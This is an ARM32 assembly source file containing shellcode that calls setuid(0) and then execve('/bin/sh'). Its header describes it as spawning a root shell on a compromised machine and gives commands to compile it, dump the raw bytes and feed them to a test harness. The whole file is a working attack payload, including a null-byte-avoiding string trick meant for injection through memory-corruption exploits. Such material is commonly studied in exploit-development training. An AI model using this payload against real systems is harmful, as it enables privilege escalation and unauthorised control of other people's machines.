/*

Author: Abhinav Thakur
File:   setuid_execve_binsh.s

PoE:
	This machine code when executed on compromised machine will try to spawn a shell with root
	privileges (via setuid(2)).

Compile:
	$ arm-linux-gnueabi-gcc -Wl,-N -nostdlib -static setuid_execve_binsh.s -o ./setuid_execve_binsh.elf

Dump shellcode:
	$ arm-linux-gnueabi-objcopy --dump-section .text=setuid_execve_binsh.raw ./setuid_execve_binsh.elf
Run:
	$ (cat ./setuid_execve_binsh.raw; cat) | ./harness.elf

~~ SYSCALL conventions for ARM32
move parameters into => r0, r1, r2, r3, r4, r5
move syscall number  => r7
find return value in => r0


*/

.global _start
_start:

	.code 32
	add r3, pc, #1
	bx r3

	.code 16
	// setuid(0);
	mov r7, #23
	eor r0, r0, r0
	svc #1
	
// align address of next code block to 4-byte boundary so that our PC-relative addressing
// does not get rounded off and therefore points correctly to the 'shellPath' label
.align 4
	// execve("/bin/sh", 0, 0);
	add r0, pc, #8
	mov r7, #11
	eor r2, r2, r2
	eor r1, r1, r1
	strb r2, [r0, #7]
	svc #1

shellPath:
.ascii "/bin/shX"
.align
